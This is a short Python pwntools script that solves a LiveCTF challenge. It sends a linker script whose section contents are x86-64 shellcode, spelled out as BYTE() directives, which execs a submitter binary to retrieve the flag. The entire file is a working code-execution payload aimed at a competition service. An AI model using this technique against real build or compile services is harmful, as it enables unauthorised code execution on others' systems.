#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))

ld_script = b"""SECTIONS
{   
    . = 0x1000;
    .text ALIGN (0x00) :
    {
        BYTE(0x6a)
        BYTE(0x1)
        BYTE(0x48)
        BYTE(0xb8)
        BYTE(0x1)
        BYTE(0x1)
        BYTE(0x1)
        BYTE(0x1)
        BYTE(0x1)
        BYTE(0x1)
        BYTE(0x1)
        BYTE(0x1)
        BYTE(0x50)
        BYTE(0x48)
        BYTE(0xb8)
        BYTE(0x63)
        BYTE(0x6c)
        BYTE(0x68)
        BYTE(0x75)
        BYTE(0x75)
        BYTE(0x64)
        BYTE(0x73)
        BYTE(0x1)
        BYTE(0x48)
        BYTE(0x31)
        BYTE(0x4)
        BYTE(0x24)
        BYTE(0x48)
        BYTE(0xb8)
        BYTE(0x76)
        BYTE(0x65)
        BYTE(0x63)
        BYTE(0x74)
        BYTE(0x66)
        BYTE(0x2f)
        BYTE(0x73)
        BYTE(0x75)
        BYTE(0x50)
        BYTE(0x48)
        BYTE(0xb8)
        BYTE(0x2f)
        BYTE(0x68)
        BYTE(0x6f)
        BYTE(0x6d)
        BYTE(0x65)
        BYTE(0x2f)
        BYTE(0x6c)
        BYTE(0x69)
        BYTE(0x50)
        BYTE(0x48)
        BYTE(0x89)
        BYTE(0xe7)
        BYTE(0xbe)
        BYTE(0x0)
        BYTE(0x0)
        BYTE(0x0)
        BYTE(0x0)
        BYTE(0xba)
        BYTE(0x0)
        BYTE(0x0)
        BYTE(0x0)
        BYTE(0x0)
        BYTE(0xb8)
        BYTE(0x3b)
        BYTE(0x0)
        BYTE(0x0)
        BYTE(0x0)
        BYTE(0xf)
        BYTE(0x5)
    }
}

"""

io.sendline(ld_script)


flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('%s', flag)